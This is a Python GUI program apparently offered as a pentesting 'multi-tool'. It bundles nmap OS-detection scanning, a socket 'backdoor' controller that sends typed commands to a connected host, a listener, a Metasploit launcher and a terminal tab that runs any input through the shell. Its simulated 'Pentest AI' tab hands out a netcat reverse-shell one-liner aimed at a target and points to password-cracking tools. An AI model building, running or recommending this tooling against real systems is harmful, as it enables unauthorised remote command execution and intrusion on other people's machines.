import socket
import subprocess
import nmap
import threading
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
from tkinter import ttk
import logging
from logging.handlers import RotatingFileHandler

# Log file setup with rotation
log_file = 'multi_tool.log'
log_handler = RotatingFileHandler(log_file, maxBytes=1024*1024, backupCount=5)  # 1MB per log, 5 backups
logging.basicConfig(handlers=[log_handler], level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"

# Nmap settings
nmap_args = "-Pn -sT -O"

def print_banner():
    """Print the banner for the tool."""
    banner = """
    ███╗   ██╗██╗   ██╗██╗     ██████╗██╗   ██╗██╗      ██████╗██╗
    ████╗  ██║██║   ██║██║     ██╔════╝██║   ██║██║     ██╔════╝██║
    ██╔██╗ ██║██║   ██║██║     ██║     ███████║██║     ██║     ██║
    ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║██║     ██║     ██║
    ██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║███████╗╚██████╗██║
    ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝
    MultiToolV4 - Enhanced Multi-Tool for Pentesting 🛠️
    """
    print(banner)

# ===================== Functions for Tabs ===================== #

def scan_target(rhost, output_area):
    """Perform a passive scan using Nmap and output results to the GUI."""
    try:
        logging.info(f"Starting scan for target: {rhost}")
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=nmap_args)
        os_info = get_os_info(nm, rhost)
        result = f"Target OS: {os_info}\n{nm.csv()}"
        output_area.insert(tk.END, result + '\n')
    except Exception as e:
        logging.error(f"Failed to scan target: {rhost} - {str(e)}")
        messagebox.showerror("Error", f"Failed to scan target: {str(e)}")

def get_os_info(nm, rhost):
    """Extract OS information from Nmap results."""
    try:
        os_info = nm[rhost].get('osmatch', [{}])[0].get('name', 'Unknown')
        return os_info
    except KeyError:
        logging.warning(f"OS information not available for: {rhost}")
        return "Unknown OS"

def create_backdoor(lhost, port=8080, output_area=None):
    """Create a simple backdoor using sockets."""
    try:
        logging.info(f"Creating backdoor on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        if output_area:
            output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        if output_area:
            output_area.insert(tk.END, f"Connection established with {addr}\n")
        while True:
            cmd = simpledialog.askstring("Command Input", "Enter command:")
            if cmd.lower() in ['exit', 'quit']:
                logging.info("Backdoor session terminated by user.")
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            if output_area:
                output_area.insert(tk.END, response + '\n')
        conn.close()
    except Exception as e:
        logging.error(f"Error in backdoor: {str(e)}")
        if output_area:
            output_area.insert(tk.END, f"Error in backdoor: {str(e)}\n")
    finally:
        sock.close()

def create_listener(lhost, port=8081, output_area=None):
    """Create a listener to receive incoming connections."""
    try:
        logging.info(f"Creating listener on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        if output_area:
            output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        if output_area:
            output_area.insert(tk.END, f"Connected to {addr}\n")
        while True:
            data = conn.recv(4096).decode()
            if not data:
                break
            if output_area:
                output_area.insert(tk.END, f"Received: {data}\n")
        conn.close()
    except Exception as e:
        logging.error(f"Error in listener: {str(e)}")
        if output_area:
            output_area.insert(tk.END, f"Error in listener: {str(e)}\n")
    finally:
        sock.close()

def run_msfconsole(output_area=None):
    """Run the Metasploit console."""
    try:
        logging.info("Launching msfconsole...")
        process = subprocess.Popen(['msfconsole'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if output_area:
            output_area.insert(tk.END, output.decode() + '\n')
            if error:
                output_area.insert(tk.END, error.decode() + '\n')
    except Exception as e:
        logging.error(f"Failed to start msfconsole: {str(e)}")
        if output_area:
            output_area.insert(tk.END, f"Error: {str(e)}\n")

def run_terminal_command(command, output_area):
    """Run any command from the terminal tab."""
    try:
        logging.info(f"Running command: {command}")
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_area.insert(tk.END, output.decode() + '\n')
        if error:
            output_area.insert(tk.END, error.decode() + '\n')
    except Exception as e:
        logging.error(f"Failed to execute command: {str(e)}")
        output_area.insert(tk.END, f"Error: {str(e)}\n")

def ai_suggestions(query, output_area):
    """Simulate AI suggestions for pentesting tasks based on user input."""
    # Simple predefined responses for demonstration
    suggestions = {
        "scan": "You can use nmap or masscan for scanning. Try: nmap -sS -T4 target_ip",
        "exploit": "Metasploit can help you with exploitation. Use: msfconsole -> search exploit.",
        "backdoor": "Create a reverse shell using: nc -e /bin/bash target_ip 4444",
        "password": "Try tools like Hydra or John the Ripper for password cracking."
    }

    for key in suggestions:
        if key in query.lower():
            output_area.insert(tk.END, suggestions[key] + "\n")
            return

    output_area.insert(tk.END, "No AI suggestion found for the query.\n")

# ===================== GUI Functions ===================== #

def create_gui():
    """Create the main GUI with tabbed interface."""
    root = tk.Tk()
    root.title("Multi Tool V4")

    # Create notebook for tabs
    notebook = ttk.Notebook(root)
    notebook.pack(expand=True, fill='both')

    # Backdoor Tab
    backdoor_tab = ttk.Frame(notebook)
    notebook.add(backdoor_tab, text="Backdoor")

    # Backdoor log area
    backdoor_output = scrolledtext.ScrolledText(backdoor_tab, wrap=tk.WORD)
    backdoor_output.pack(expand=True, fill='both')

    # Backdoor Start Button
    backdoor_button = tk.Button(backdoor_tab, text="Start Backdoor", 
                                command=lambda: threading.Thread(target=create_backdoor, 
                                                                  args=(LHOST, 8080, backdoor_output),
                                                                  daemon=True).start())
    backdoor_button.pack(pady=5)

    # Listener Tab
    listener_tab = ttk.Frame(notebook)
    notebook.add(listener_tab, text="Listener")

    # Listener log area
    listener_output = scrolledtext.ScrolledText(listener_tab, wrap=tk.WORD)
    listener_output.pack(expand=True, fill='both')

    # Listener Start Button
    listener_button = tk.Button(listener_tab, text="Start Listener", 
                                command=lambda: threading.Thread(target=create_listener, 
                                                                  args=(LHOST, 8081, listener_output),
                                                                  daemon=True).start())
    listener_button.pack(pady=5)

    # Terminal Tab
    terminal_tab = ttk.Frame(notebook)
    notebook.add(terminal_tab, text="Terminal")

    # Terminal log area
    terminal_output = scrolledtext.ScrolledText(terminal_tab, wrap=tk.WORD)
    terminal_output.pack(expand=True, fill='both')

    # Terminal command input
    terminal_command = tk.Entry(terminal_tab)
    terminal_command.pack(fill='x', padx=10, pady=5)

    # Terminal Run Button
    terminal_button = tk.Button(terminal_tab, text="Run Command", 
                                command=lambda: run_terminal_command(terminal_command.get(), terminal_output))
    terminal_button.pack(pady=5)

    # Pentest AI Tab
    ai_tab = ttk.Frame(notebook)
    notebook.add(ai_tab, text="Pentest AI")

    # AI log area
    ai_output = scrolledtext.ScrolledText(ai_tab, wrap=tk.WORD)
    ai_output.pack(expand=True, fill='both')

    # AI query input
    ai_query = tk.Entry(ai_tab)
    ai_query.pack(fill='x', padx=10, pady=5)

    # AI Run Button
    ai_button = tk.Button(ai_tab, text="Ask AI", 
                          command=lambda: ai_suggestions(ai_query.get(), ai_output))
    ai_button.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    print_banner()
    create_gui()
